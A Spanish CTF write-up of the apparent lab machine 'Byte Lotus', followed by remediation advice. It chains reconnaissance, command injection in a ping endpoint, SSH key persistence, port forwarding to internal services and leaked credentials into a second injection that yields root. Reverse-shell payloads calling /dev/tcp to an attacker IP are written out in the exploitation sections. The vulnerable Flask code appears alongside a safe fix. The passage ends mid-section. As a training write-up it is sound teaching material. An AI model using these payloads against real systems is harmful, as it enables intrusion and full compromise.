# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -sS -Pn -n -vvv --min-rate 5000 $IP

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p22,80 -Pn -n -sVC --min-rate 5000 -v -oN versiones $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:61:f0:17:3c:99:86:de:0f:05:d5:21:58:49:73:c9 (ECDSA)
|_  256 11:b6:d0:ba:ac:6c:78:5e:9a:4d:d5:cd:47:4a:88:c2 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Byte Lotus &mdash; Stay Noticed
| http-robots.txt: 2 disallowed entries 
|_/internal/ /status
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## <font color=red>[~]</font> Entorno web

Cuando accedemos al `index.html` del servidor web vemos una página web muy sencilla en la que podemos ver:

1. Un poco de información del hotel
2. Un ***botón deshabilitado*** en el que se podrá reservar en el futuro.
3. Tres *widgets* promocionando aspectos específicos del hotel.
4. Un *navbar* con tres opciones (*Suites*, *Amenities*, *Contact*). Las tres opciones nos redirigen a la misma página en la que estamos (`/`).

Con esta información no podemos hacer mucho, pero debemos mirar el código fuente de la página para ver si esconde algo interesante. Así encontramos que al terminar de cargarse la página web por completo, se llama a un script en la siguiente ubicación: `/static/app.js`.

```JS
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed\u2122");
```

Este código muestra una serie de comentarios que corresponden a un *TODO List (Lista de taraeas)* que nos dan pistas sobre algunos *endpoints* que pueden ser interesantes.

```
|_ /status
|_ /internal/netcheck
```

### <font color=red>[-]</font> `/status`

En este *endpoint* encontramos una función que nos permite verificar si el servidor tiene conectividad con otras máquinas (podemos probarla usando cualquier IP para tratar de averiguar como funciona).

```
10.0.0.5  -> Check

PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.

--- 10.0.0.5 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

Esta es la salida típica del comando `ping`. Por lo que seguramente el flujo de ejecución de esta función web sea la siguiente:

1. El usuario especifica la IP o Dominio de la máquina que quiere verificar.
2. El servidor toma el *input* del usuario y lo usa como parámetro para el comando del sistema `ping <input_usuario>`
3. El servidor muestra la salida del comando en la página web.

#### <font color=red>[!]</font> RCE

Este tipo de funciones de una app web son críticas, ya que si el servidor inserta el *input* del usuario directamente en el comando del sistema, un atacante podría modificar la entrada para ejecutar código malicioso en el servidor.

Podemos probar si el servidor es vulnerable a ***RCE (Remote Code Execution)*** con el siguiente payload:

```
10.0.0.5 ; id  -> Check

PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.

--- 10.0.0.5 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

uid=1001(web) gid=1001(web) groups=1001(web)
```

>***ÉXITO!*** En la respuesta del servidor podemos ver la salida del comando `id` (***EXPLICACIÓN***).

# <font color=red>[+]</font> Explotación

Con esto podemos hacer que el servidor ejecute una reverse shell hacia nuestra máquina. Para ello:

1. Preparamos el ***listener*** en nuestra máquina atacante:
```bash
nc -lvnp 4444
```

2. Ejecutamos el código encargado de crear la reverse shell hacia nuestra máquina:
```
10.0.0.5 ; /bin/bash -c "/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1"  -> Check
```

>Recibiremos la reverse shell en nuestro ***listener***.

# <font color=red>[+]</font> Post-Explotación

## <font color=red>[~]</font> Tratamiento de Shell

Una vez obtenemos acceso al sistema a través de la reverse shell, lo que obtenemos es una ***pseudoshell*** muy limitada. Para mejorar y poder tener una shell completa con ventajas como el *autocompletado* o el uso de herramientas como `clear` seguiremos estos pasos:

1. Generamos un *shell* en ***Bash*** redirigiendo todo hacia `/dev/null`.
```bash
script -c bash /dev/null
```

2. Pausaremos un momento la reverse shell para configurar la terminal de nuestra máquina atacante:
```bash
CTRL+Z    # Pausamos la Reverse Shell

stty raw -echo ; fg    # Configuramos le terminal y volvemos a la Reverse Shell
```

3. Configuraremos las variables de entorno necesarias:
```bash
export TERM=xterm    # Configuramos la variable de entorno TERM
export PS1="\w$ "    # Configuramos la variable de entorno PS1 (hacer más pequeño el prompt)
```

## <font color=red>[~]</font> Escalada de privilegios

Cuando accedemos al sistema, lo hacemos como el usuario `web`. Esto no es muy común, ya que por lo general accedemos a través del usuario del sistema `www-data` (encargado de gestionar todo el entorno web en el servidor). Esto nos permite partir con una cierta ventaja al poder realizar más acciones que con un usuario de sistema.

### <font color=red>[-]</font> `/home/web`

Si miramos el contenido del directorio `home` del usuario `web` encontramos la ***flag*** `user.txt`. Además, si miramos los archivos y directorios ocultos, encontramos el directorio `.ssh` del cual tenemos permisos completos:

```bash
ls -la /home/web

<snip>
drwxr-xr-x 2 web  web  4096 Jun 30 09:23 .ssh
-rw-r--r-- 1 web  web    21 Jun 30 09:07 user.txt
```

Dentro del subdirectorio `.ssh` encontramos el archivo `authorized_keys` (***[Explicación](#authorized_keys)***). Al tener permisos de escritura sobre este archivo, podemos crear un par de claves SSH con las que poder acceder al servidor como el usuario `web`.

1. Creamos las claves en nuestra máquina atacante:
```bash
ssh-keygen -t rsa -f ./id_rsa  # Crea un par de claves (Privada y Pública) RSA, y la guardamos con el nombre id_rsa (id_rsa e id_rsa.pub)

# Cuando nos pidan una clave podemos dar enter para no poner ninguna
```

2. Cambiamos los permisos de la clave ***Privada***:
```bash
chmod 600 id_rsa
```

3. Copiamos la clave pública en el archivo `authorized_keys` del servidor:
```bash
echo "Clave_pública" > /home/web/.ssh/authorized_keys
```

4. Nos conectamos vía SSH como el usuario `web` usando la clave privada:
```bash
ssh web@$IP -i id_rsa
```

>[!Note]
>Con esto no habremos escalado privilegios (ya que seguiremos siendo el usuario `web`), pero obtenemos una conexión mucho más cómoda, estable y completa que una reverse shell.

### <font color=red>[-]</font> Conexiones de red

Tras estar mirando posibles vectores de ataque para escalar privilegios, decidí mirar los sockets en escucha que tiene nuestra máquina víctima:

```bash
ss -tuln

Netid           State            Recv-Q           Send-Q                            Local Address:Port                        Peer Address:Port           Process                                          
tcp             LISTEN           0                4096                              127.0.0.53%lo:53                               0.0.0.0:*                                
tcp             LISTEN           0                2048                                  127.0.0.1:9000                             0.0.0.0:*                                
tcp             LISTEN           0                10                                    127.0.0.1:5038                             0.0.0.0:*                                
tcp             LISTEN           0                2048                                  127.0.0.1:3000                             0.0.0.0:*                                
tcp             LISTEN           0                4096                                 127.0.0.54:53                               0.0.0.0:*                                
tcp             LISTEN           0                10                                    127.0.0.1:8088                             0.0.0.0:*                                
tcp             LISTEN           0                10                                    127.0.0.1:8089                             0.0.0.0:*                                
tcp             LISTEN           0                511                                   127.0.0.1:8080                             0.0.0.0:*                                
tcp             LISTEN           0                80                                    127.0.0.1:3306                             0.0.0.0:*                                
tcp             LISTEN           0                4096                                    0.0.0.0:22                               0.0.0.0:*                                
tcp             LISTEN           0                2048                                    0.0.0.0:80                               0.0.0.0:*                                
tcp             LISTEN           0                4096                                       [::]:22                                  [::]:*
```

Si analizamos la salida del comando anterior, podemos ver que hay algunos puertos que tan solo son accesibles desde el mismo servidor.

Los puertos `22` y `80` son los servicios *SSH* y *HTTP* de los cuales ya teníamos conciencia. El puerto `53` pertenece al servicio *DNS*. Por lo que nos quedamos con el resto de puertos (`9000`, `5038`, `3000`, `8088`, `8089`, `8080` y `3306`).

El puerto `3306` es el puerto por defecto del ***Sistema Gestor de Bases de Datos MySQL***, y como no tenemos credenciales con los que tratar de entrar, de momento no lo abriremos.

>[!important]
>***Un puerto abierto no representa automáticamente un vector de explotación o escalda de privilegios:***
>
>- Muchos puertos locales pertenecen a *daemons* del sistema, canales de comunicación interprocesos (***IPC***) o servicios estándar (como `systemd-resolved` o `rpcbind`) con funcionalidad restringida.
>- Para priorizar esfuerzos y reducir ruido, filtramos aquellos servicios que ofrecen una interfaz interactiva de alto nivel, principalmente ***servicios HTTP/APIs internas***, ya que suelen concentrar la mayor superficie de ataque (paneles de administración, consolas de depuración, versiones desactualizadas o *endpoints* sin autenticación).
>

Podemos ver que puertos pueden tener servicios interesantes con el siguiente *One-liner* de *Bash*:

```bash
for port in 3000 5038 8080 8088 8089 9000; do echo "[+] Probando puerto $port:" ; curl -s -m 3 http://127.0.0.1:$port/ -i | head -c 200 ; echo ; done

[+] Probando el puerto 3000: 
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 15 Aug 2026 20:04:53 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1294

<!doctype html>
<html lang="en">
<head>
<meta
[+] Probando el puerto 5038: 

[+] Probando el puerto 8080: 
HTTP/1.1 200 OK
Date: Sat, 15 Aug 2026 20:04:53 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Tue, 30 Jun 2026 09:08:09 GMT
ETag: "29af-65574e9f0ac4b"
Accept-Ranges: bytes
Content-Length: 10

[+] Probando el puerto 8088: 
HTTP/1.1 404 Not Found
Server: Asterisk/20.6.0~dfsg+~cs6.13.40431414-2build5
Date: Sat, 15 Aug 2026 20:04:53 GMT
Cache-Control: no-cache, no-store
Content-type: text/html
Content-Length: 277

<
[+] Probando el puerto 8089: 

[+] Probando el puerto 9000: 
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Sat, 15 Aug 2026 20:04:53 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 207

<!doctype html>
<html lang=en>
<title>4
```

- Podemos ver que el puerto `5038` y `8089` no responden, por lo que nos centraremos en el resto de momento.
- Los puertos `9000` y `8088` han respondido con un código `404 NOT FOUND`. Esto significa que en estos puertos corre un servidor web, pero parece ser necesario conocer rutas específicas ya que no cuentan con un archivo `index.*` que responda automáticamente.
- Los puertos `3000` y `8080` si responden con un código `200 OK`.

#### <font color=red>[!]</font> Puerto `8080`

Si realizamos una petición al puerto `8080` usando `curl` podremos ver el código fuente de la página por defecto ***Apache***. No obstante, puede que contenga más de lo que aparenta.

Si nos dirigimos a la carpeta `/var/www/` (donde suele encontrarse los archivos web), podemos ver que existen dos directorios (`html` e `infinity_pool`). La carpeta `html` es la carpeta por defecto en la instalación de ***Apache***, por lo que si miramos dentro encontramos:

- `index.html`: Si miramos su contenido es el mismo archivo por defecto de Apache que vimos antes, por lo que parece que es en esta carpeta donde se encuentran los archivos del servidor que corre en el socket `127.0.0.1:8080`.
- `index.php`: Hay un archivo `index.php` que si miramos su contenido vemos un comentario que nos dice que la licencia de todo el código delese módulo de ***FreePBX*** se puede encontrar en el archivo de licencia dentro del directorio del módulo. ***Qué es FreePBX?***
- `robots.txt`: Definitivamente no es el mismo contenido que podíamos encontrar en el archivo `robots.txt` del servidor en el puerto `80`.
- `/admin/`: Es un directorio que llama mucho la atención (seguramente de ese ***FreePBX*** que vimos antes)
- `ucp`: Enlace simbólico hacia dentro del directorio `/admin/` anterior.

Después de todo este ***reconocimiento pasivo***, lo pregunta más importante que se nos viene a la cabeza es: ***Qué es ese FreePBX?***

>[!Note]
>***FreePBX (Free Private Branch Exchange)*** es una interfaz gráfica web de código abierto diseñada para gestionar y configurar fácilmente servidores de telefonía IP basados en ***Asterisk***.
>
>En lugar de tener que editar manualmente archivos de configuración complejos por terminal, ***FreePBX*** permite administrar extensiones, llamadas, buzones de voz y rutas telefónicas desde el navegador.
>
>- ***Función principal:*** Es el panel de control web (*frontend*) que simplifica la administración del motor telefónico Asterisk (*backend*).
>- ***Tecnología habitual:*** Está desarrollado principalmente en ***PHP*** y suele ejecutarse sobre servidores como Apache junto con ***bases de datos MySQL/MariaDB***.

Una vez que sabemos que es un panel de control, lo más optimo para usar la herramienta no es la línea de comandos, sino la misma interfaz gráfica que nos da la herramienta. Sin embargo, tenemos un problema:

*El servicio web está vinculado exclusivamente a la interfaz de **loopback** (`127.0.0.1`), lo que significa que el servidor solo acepta conexiones que se originen dentro de la propia máquina.*

Dado que estamos en una sesión remota por terminal (sin entorno gráfico ni acceso físico a la máquina), no podemos abrir un navegador directamente en el objetivo.

El navegador del servidor no tiene ninguna propiedad especial; la única razón por la que puede comunicarse con la aplicación es porque sus peticiones provienen de `127.0.0.1`. Si logramos que las peticiones generadas desde el navegador de nuestra máquina atacante parezcan originarse localmente en la máquina víctima, podremos interactuar con la app como si estuviéramos dentro de ella.

Para resolver este problema y acceder cómodamente al panel web desde nuestro propio navegador, recurrimos a una técnica de redirección de puertos: un ***Túnel SSH (Local Port Forwarding)***.

##### <font color=red>[@]</font> Túnel SSH (Local Port Forwarding)

>[!important]
>Para poder generar estos túneles, debemos de poder generar conexiones legítimas a la víctima (podemos gracias a las claves SSH que generamos anteriormente).

Para traer el servicio interno hacia nuestra máquina y poder interactuar con él desde nuestro navegador, ejecutamos el siguiente comando en nuestra máquina atacante:

```bash
ssh -L <PUERTO_ATACANTE>:127.0.0.1:<PUERTO_SERVICIO_EN_LA_VICTIMA> usuario@$IP -i id_rsa
```

- **`-L` (_Local Forwarding_):** Le indica al cliente SSH de nuestra máquina que cree un túnel de reenvío local.
- **`<PUERTO_ATACANTE>`:** Abre un puerto a la escucha en nuestra máquina atacante (ej: `localhost:8080`).
- **`127.0.0.1` (_Host destino visto por el servidor_):** La dirección a la que el servidor SSH de la víctima debe enviar los datos. Al indicarle `127.0.0.1`, el servidor contacta con su propio socket interno.
- **`<PUERTO_SERVICIO_EN_LA_VICTIMA>`:** El puerto interno de la máquina víctima donde reside el servicio web.
- **`usuario@IP_VICTIMA`:** La sesión SSH estándar que transporta todo este tráfico encapsulado y cifrado.
- **`-i id_rsa`:** Especifica que vamos a usar la ***clave privada*** para conectarnos al servidor.

###### Conexión

```bash
ssh -L 8080:127.0.0.1:8080 usuario@$IP -i id_rsa
```

1. Abrimos el navegador en nuestra máquina y navegamos a `http://127.0.0.1:8080`.
2. Nuestro cliente SSH intercepta la petición entrante en el puerto `8080` local y la encapsula dentro del túnel SSH existente.
3. El servidor SSH de la máquina víctima recibe los datos cifrados, los desempaqueta y realiza la conexión hacia `127.0.0.1:8080` en nuestro nombre.
4. Para la aplicación interna, la petición se originó legítimamente desde `127.0.0.1`, permitiéndonos acceder al panel de administración sin restricciones de red.

Si todo ha ido bien, cuando ejecutemos el comando veremos que hemos iniciado sesión vía SSH en el servidor. Ahora, podremos ir al navegador de nuestra máquina atacante y usar la APP usando la URL `http://127.0.0.1:8080`. Si vemos la página por defecto de *Apache* comprobaremos que todo ha funcionado correctamente.

##### <font color=red>[@]</font> FreePBX

Una vez tengamos acceso al puerto `8080` de la víctima desde nuestra máquina, podemos usar la APP de ***FreePBX***.

Ahora necesitamos saber las rutas que podemos usar. Antes vimos algunas con el reconocimiento pasivo que hicimos desde el servidor, pero es importante tener algo en cuenta:

>[!important]
>Con el túnel SSH, todo lo que hagamos con el puerto `8080` de nuestra máquina atacante se redirigirá hacia el puerto `8080` de la víctima. Por lo que si no conociéramos las rutas podríamos incluso hacer ***Fuzzing***:
>
>```bash
>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://127.0.0.1:8080/FUZZ -fc 404
>
>admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 101ms]
>server-status           [Status: 200, Size: 20398, Words: 479, Lines: 331, Duration: 39ms]
>```

Una vez que conocemos la ruta `/admin/` podemos acceder a ella: `http://127.0.0.1:8080/admin/`. En este enlace encontraremos un panel de `login` de la herramienta ***FreePBX***.

- ***FreePBX Administration***: Panel de control para administradores donde se configuran el motor telefónico Asterisk, las rutas, extensiones, módulos y políticas de seguridad del sistema.
- ***User Control Panel (UCP)***: Es la interfaz web para el usuario final que permite gestionar su propia extensión, escuchar grabaciones o buzones de voz, enviar faxes y ver su historial de llamadas sin tener permisos de administración.
- ***Get Support***: Nos redirige al subdominio de ayuda (`help.sangoma.com`).

Cuando tratamos de acceder al ***panel de administracicón*** o al ***ucp*** se nos pide unas credenciales. Lo primero que se me ocurre es tratar de usar las credenciales por defecto de la APP (buscando en Internet), pero no tenemos suerte. Por lo que parece que estamos aquí atrapados hasta que podamos encontrar unas credenciales, o al menos un usuario al que poder hacer fuerza bruta.

#### <font color=red>[!]</font> Puerto `3000`

Recordemos que el puerto `3000` también respondía con un código de estado `200 OK`, por lo que podemos ver que nos devuelve el servidor web de ese puerto:

```html
<!-- En la máquina víctima (el servidor que comprometimos) -->
curl -s "http://127.0.0.1:3000"

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Watchtower &mdash; ops console</title>
<style>
  body{margin:0;background:#0a0b0e;color:#e7e9ee;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
  header{padding:16px 24px;border-bottom:1px solid #262a31;letter-spacing:.2em}
  main{max-width:760px;margin:0 auto;padding:40px 24px}
  .tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:20px}
  .tile{background:#15171c;border:1px solid #262a31;border-radius:10px;padding:18px}
  .tile b{display:block;font-size:1.6rem}
  .muted{color:#8b909b}
  code{color:#c9a24b}
</style>
</head>
<body>
<header>WATCHTOWER &middot; <span class="muted">internal</span></header>
<main>
  <h1>Surveillance operations</h1>
  <p class="muted">Loopback-only console. Authenticated by network position.</p>
  <div class="tiles">
    <div class="tile"><b>1184</b><span class="muted">active feeds</span></div>
    <div class="tile"><b>OK</b><span class="muted">datastore link</span></div>
    <div class="tile"><b>root</b><span class="muted">automation worker</span></div>
  </div>
  <p class="muted" style="margin-top:28px">
    Service endpoints: <code>/api/health</code> &middot; <code>/api/config</code>
  </p>
</main>
</body>
</html>
```

Podemos ver que se especifican unos ***API endpoints*** (`/api/health` y `/api/config`). Si interactuamos con dichos *endpoints*:

```bash
# Consultamos el estado del servidor
curl -s "http://127.0.0.1:3000/api/health"

{"bind":"127.0.0.1:3000","service":"watchtower","status":"ok"}
```

```bash
# Consultamos la configuración
curl -s "http://127.0.0.1:3000/api/config"

{"automation_endpoint":"http://127.0.0.1:9000","note":"internal network only -- do not expose","ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.","telephony_pass":"[hidden]","telephony_portal":"http://127.0.0.1:8080/ucp","telephony_user":"[hidden]"}
```

>***BINGO!!!!*** En la respuesta del servidor obtenemos las credenciales para el ***ucp*** del servidor en el puerto `8080` (`"http://127.0.0.1:8080/ucp"`).

Cuando accedemos al *Dashboard* de `/ucp/`, vemos que podemos crear unos ***widgets*** (si pulsamos en el símbolo `+` de la izquierda). Fui revisando uno por uno para ver si podían hacer algo interesante, y el *widget **Voicemail*** llamó mi atención.

##### *Widget Voicemail*

Este *Widget* nos permite configura el ***Buzón de voz***. Pero no es su funcionalidad la que me interesa, sino el ***Automation Key*** que podemos ver. Además, vemos `<9000>`, lo que parece ser una referencia al `automation_endpoint` que vimos antes desde el puerto `3000`.

#### <font color=red>[!]</font> Puerto `9000`

En el puerto `9000` corre un servidor `gunicorn` que no cuenta con una página por defecto, por lo que nos mostraba un `404 NOT FOUND` en el *One-Liner*. Pero podemos verificar si existen algún archivo oculto realizando *fuzzing* web. Para ello, creamos un nuevo ***túnel SSH***:

```bash
# En la máquina atacante
ssh -L 9000:127.0.0.1:9000 web@$IP -i id_rsa
```

Una vez creado el túnel SSH, todo lo que mandemos a través del puerto `9000` de nuestra máquina atacante llegará al puerto puerto `9000` de la máquina víctima.

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://127.0.0.1:9000/FUZZ -fc 404

health                  [Status: 200, Size: 245, Words: 12, Lines: 2, Duration: 69ms]
```

Encontramos un *endpoint* denominado `health` al cual si realizamos una consulta podremos ver los distintos *endpoints* con los que podemos interactuar. Además, vemos que el servicio corre como `root`, por lo que es muy posible que corra con permisos elevados.

```bash
curl -s http://127.0.0.1:9000/health | jq

{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {
        "report": "<report name>"
      },
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

Vemos que podemos hacer una petición ***HTTP POST*** al *endpoint* `/jobs/export` con los parámetros que se muestran.

>[!Warning]
>Parece ser que el cuerpo de la petición (`report`) pide un nombre con el que guardar el reporte. Cuando realizamos la petición, podemos ver en la respuesta que se ejecuta el comando `tar czf /var/automation/exports/<nombre_reporte>.tgz /var/automation/data 2>&1`.
>
>```JSON
>{
>  "command": "tar czf /var/automation/exports/prueba.tgz /var/automation/data 2>&1",
>  "output": "tar: Removing leading `/' from member names\n"
>}
>```
>
>Ahora sabemos que esta petición ejecuta el comando del sistema `tar`, por lo que puede ser que sea, al igual que el *endpoint* `/status`, vulnerable a ***command injection***:
>
>```bash
>curl -s http://127.0.0.1:9000/jobs/export -H "Authorization: Bearer [hidden]" -H "Content-Type: application/json" -d '{"report":"prueba ; /bin/bash -c \"/bin/bash -i >& /dev/tcp/IP_KALI/4445 0>&1\" #"}'
>```
>
>Con este comando estamos creando una nueva reverse shell (*esta vez por el puerto `4445`*), por lo que tan solo tendremos que levantar el *listener* en nuestra máquina con el comando `nc -lvnp 4445` y obtendremos una reverse shell como `root`.

#### <font color=red>[?]</font> Por qué obtenemos la shell como `root`?

Debido a que el servicio ejecuta el comando `tar czf` con permisos de `root`, cuando concatenamos más comandos separándolos de alguna forma como con `;`, `&&` o `||`, el comando insertado también es *ejecutado* por `root`. Por lo que, como el proceso es ejecutado por `root`, los permisos son los mismos.

---
# Implementaciones de seguridad

## <font color=red>[!]</font> Eliminar `/static/app.js`

Al auditar los recursos cargados por la página principal (`index.html`), se identificó la inclusión del script `/static/app.js`. Al inspeccionar su contenido, se observa que la única instrucción ejecutable es una traza decorativa en consola:

```JS
console.log("Stay Noticed\u2122"); // stay Noticed™
```

Sin embargo, el archivo expone comentarios internos y tareas pendientes (`TODOs`) destinadas al equipo de desarrollo, revelando:

1. La existencia de una herramienta interna en `/status`.
2. El uso de un *backend* heredado (`/internal/netcheck`).
3. La ausencia temporal de controles de acceso.

### Impacto y malas prácticas identificadas

- ***Exposición de Metadatos y Arquitectura Interna:*** Los comentarios en código fuente cliente son públicos. Revelar notas de implementación o rutas no enlazadas reduce el coste de enumeración para un atacante y facilita el mapeo de superficie de ataque no autenticadas.
- ***Falta de Pipeline de Compilación/Minificación:*** Desplegar archivos JavaScript sin procesar en producción expone notas internas y genera peticiones HTTP innecesarias para scripts que no aportan funcionalidad a la aplicación.

### Remediación recomendada

1. ***Eliminar el archivo o implementar un minificador:*** Integrar herramientas en el flujo de integración continua (*CI/CD*) que eliminen comentarios, `TODOs` y `console.log` antes de desplegar a producción (usando herramientas como *Terser*, *esbuild* o *Webpack*).
2. ***Control estricto de notas de desarrollo:*** La gestión de tareas pendientes y deuda técnica debe administrarse en el gestor de incidencias interno (ej. *Jira*, *GitHub Issues*) y no en el código distribuido al cliente.

## <font color=red>[!]</font> Retirada de *endpoints* de Diagnóstico (`/status` e `/internal/netcheck`)

La medida más efectiva para eliminar el riesgo de raíz es el ***desmantelamiento (decommissioning) y eliminación completa*** de las rutas `/status` e `/internal/netcheck` del entorno de producción.

```Python
# Código a eliminar del archivo de la aplicación (app.py)

# ELIMINAR
# @app.route("/status") 
# def status(): 
#     return render_template("status.html", host="", output="") 

# ELIMINAR: 
# @app.route("/internal/netcheck", methods=["POST"]) 
# def netcheck(): 
# ...
```

### Justificación técnica y principios de seguridad

- ***Reducción de la Superficie de Ataque (Attack surfacce Reduction):*** Las utilidades de diagnóstico, pruebas de red y consolas de depuración pertenecen al entorno de desarrollo o administración de sistemas, no a la app web pública. Eliminar el código huérfano o en desuso previene que atacantes exploten funcionalidades que no aportan valor al usuario final.
- ***Eliminación de Deuda Técnica:*** Como reflejaba el comentario en `app.js`, este manejador era código heredado (*legacy*) sin controles de acceso. Mantener *endpoints* incompletos en producción a la espera de "*futuras implementaciones de seguridad*" genera brechas críticas.
- ***Separación de Responsabilidades:*** Las comprobaciones de conectividad (como `ping` o `traceroute`) deben gestionarse directamente por el equipo de infraestructura mediante herramientas nativas del sistema operativo por SSH o agentes de monitorización dedicados (tipo *Prometheus*, *Zabbix* o *Nagios*), nunca a través de *wrappers* web expuestos a entradas no autenticadas.

### Alternativa si la funcionalidad es indispensable para operaciones

Si el personal de soporte requiere estrictamente una herramienta web de conectividad, esta no debe formar parte del portal público:

1. ***Aislamiento de Red:*** Mover la herramienta a un panel interno accesible únicamente mediante *VPN* corporativa o vinculada a la interfaz local (`127.0.0.1`).
2. ***Autenticación Fuerte Obligatoria:*** Integrar el *endpoint* detrás de una pasarela de autenticación corporativa con soporte para SSO y MFA antes de permitir cualquier interacción con el *backend*.

## <font color=red>[!]</font> Código vulnerable culpable del RCE en `/inernal/netcheck`

```python
import subprocess
from flask import Flask, render_template, request, send_from_directory

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/status")
def status():
    return render_template("status.html", host="", output="")


@app.route("/internal/netcheck", methods=["POST"])
def netcheck():
    host = request.form.get("host", "").strip()
    if not host:
        return render_template("status.html", host="", output="No host supplied.")
    try:
        proc = subprocess.run(
            f"ping -c 1 {host}",
            shell=True,
            capture_output=True,
            text=True,
            timeout=15,
        )
        output = proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        output = "Request timed out."
    return render_template("status.html", host=host, output=output)


@app.route("/robots.txt")
def robots():
    return send_from_directory(app.static_folder, "robots.txt", mimetype="text/plain")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

La vulnerabilidad ocurre por la combinación de dos factores críticos: ***la concatenación directa de la entrada del usuario en el comando*** y el uso del parámetro `shell=True`.

### Por qué este código es vulnerable?

```python
proc = subprocess.run(
	f"ping -c 1 {host}",  # 1. Inserción directa (f-string)
	shell=True,  # 2. Invocación de un intérprete de shell
	capture_output=True,
	text=True,
	timeout=15,
)
```

#### 1. El peligro de `shell=True`

Cuando pasamos una cadena de texto junto con `shell=True`, Python no ejecuta el binario `ping` directamente. Lo que hace por detrás es invocar una shell del sistema operativo (equivalente a `/bin/sh -c "comando"` en Linux).

Esto hace que la shell interprete cualquier metacarácter como operadores de control:

- `;` o `&&` (separadores de comandos).
- `|` (tuberías).
- `$()` (sustitución de comandos).
- `<` o `>` (redirecciones).

#### 2. La interpolación en la cadena (`f-string`)

Al hacer `f"ping -c 1 {host}"`, si el usuario envía `10.0.0.5 ; whoami`, Python contruye la cadena literal `"ping -c 1 10.0.0.5 ; whoami"`. Al recibirla con `shell=True`, el shell ejecuta `ping` y al encontrar el `;`, procesa `whoami` como una instrucción independiente.

### Cómo se corrige de forma segura?

Para evitar la inyección de comandos, se deben aplicar dos cambios clave:

1. ***Pasar los argumentos como una lista (`list`):*** Cada elemento de la lista representa un argumento independiente del comando.
2. ***Eliminar `shell=True` (usar `shell=False` por defecto):*** Python llamará directamente a la llamada al sistema `execve()`, pasando los argumento s al binario `ping` sin intermediación de ninguna shell.

```Python
# IMPLEMENTACIÓN SEGURA
proc = subprocess.run(
	["ping", "-c", "1", host],  # Argumentos separados en lista
	shell=False,  # No se invoca /bin/sh (es el avlor por defecto)
	capture_output=True,
	text=True,
	timeout=15,
)
```

### Por qué esto mitiga la vulnerabilidad?

Si un atacante envía `10.0.0.5 ; /bin/bash ...`, el sistema operativo no interpretará el `;` ni el comando inyectado; simplemente le pasará la cadena entera `10.0.0.5 ; /bin/bash ...` al programa `ping` como el nombre del host destino. `ping` responderá con un error del tipo:

```
ping: 10.0.0.5 ; /bin/bash ...: Name or Service not known
```

## <font color=red>[!]</font> Mala configuración: Violación del Principio de Menor Privilegio en el Proceso Web

Al obtener la *reverse shell* mediante la inyección de comandos en `/status`, verificamos la identidad del proceso con `whoami` e `id`, observando que la *shell* no se ejecutaba bajo la cuenta de servicio estándar (`www-data`), sino bajo la cuenta de un usuario estándar interactivo con directorio `/home` propio:

```bash
whoami
# output: web

id
# output: uid=1001(web) gid=1001(web) groups=1001(web)
```

### Impacto y Riesgo de Seguridad

- ***Violación del Principio de Menor Privilegio (Least Privilege):*** Los servidores web deben ejecutarse bajo cuentas de servicio dedicadas y desprivilegiadas (como `ww-data`, `nobody` o `nginx`), las cuales carecen de consola interactiva (`/usr/sbin/nologin`) y tienen acceso restringido en el sistema de archivos.
- ***Acceso inmediato d Datos del Usuario:*** Al comprometer la app, el atacante aterriza directamente con permisos de lectura/escritura sobre el directorio personal (`/home/web`), facilitando:
	  - Lectura de credenciales, claves SSH privadas ( `id_rsa`), historiales (`.bash_history`) o archivos confidenciales.
	  - Persistencia directa escribiendo en `~/.ssh/authorized_keys` o ficheros de inicio (`.bashrc`).
- ***Vector de escalada directo:*** El usuario del sistema suele pertenecer a grupos suplementarios (ej: `sudo`, `docker`, `lxd`, `adm`) o contar con reglas en `/etc/sudoers`, reduciendo drásticamente la complejidad para alcanzar privilegios de `root`.

### Causa Raíz

El servidor ***Flask*** fue iniciado manualmente por el usuario `web` desde su propia sesión de terminal (ej: `python3 app.py`) o mediante un servicio de `systemd` mal configurado que especifica `User=web` en lugar de una cuenta de servicio aislada.

### Remediación

#### 1. Crear una cuenta de servicio dedicada sin login interactivo:

```bash
sudo useradd -r -s /usr/sbin/nologin -d /var/www/app webapp
```

#### 2. Configurar la unidad de `systemd` para correr bajo la cuenta desprivilegiada:

```TOML
[Service]
User=webapp
Group=webapp
WorkingDirectory=/var/www/app
